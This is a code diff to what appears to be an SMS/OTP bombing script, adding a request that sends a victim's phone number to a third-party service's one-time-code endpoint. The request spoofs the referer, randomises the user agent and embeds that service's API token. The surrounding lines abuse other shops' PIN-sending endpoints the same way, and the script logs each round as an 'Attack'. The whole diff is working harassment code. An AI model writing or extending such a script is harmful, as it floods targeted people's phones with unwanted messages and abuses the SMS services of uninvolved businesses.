@@ -171,6 +171,26 @@
             log("e", `[ShoppingLive] Failed. Attack: ${i}`)
         }
 
+        try{
+            const response = await ky.post("https://jaqptdtsokkdqqpmfmio.supabase.co/functions/v1/otp-sender", {
+                headers: {
+                    referer: "https://cessa-service.elementfx.com/",
+                    "user-agent": randomUA.getRandom(),
+                    "content-type": "application/json",
+                    "apiKey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImphcXB0ZHRzb2trZHFxcG1mbWlvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYyNjIwNDMsImV4cCI6MjA5MTgzODA0M30.fmTwT7ouwC_AW-lIQRldp-k6KNaAp6YPRFgdKWVlXLM",
+                    Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImphcXB0ZHRzb2trZHFxcG1mbWlvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYyNjIwNDMsImV4cCI6MjA5MTgzODA0M30.fmTwT7ouwC_AW-lIQRldp-k6KNaAp6YPRFgdKWVlXLM",
+                    "X-Client-Info": "supabase-js-web/2.103.2"
+                },
+                json: {
+                    phone: args[0]
+                }
+            })
+
+            response.status === 200 ? log("i", `[Cessa] Success. Attack: ${i}`) : log("e", `[Cessa] Failed. Attack: ${i}`)
+        }catch{
+            log("e", `[Cessa] Failed. Attack: ${i}`)
+        }
+
         try {
             const response = await ky.post("https://www.vprok.ru/as_send_pin", {
                 headers: {
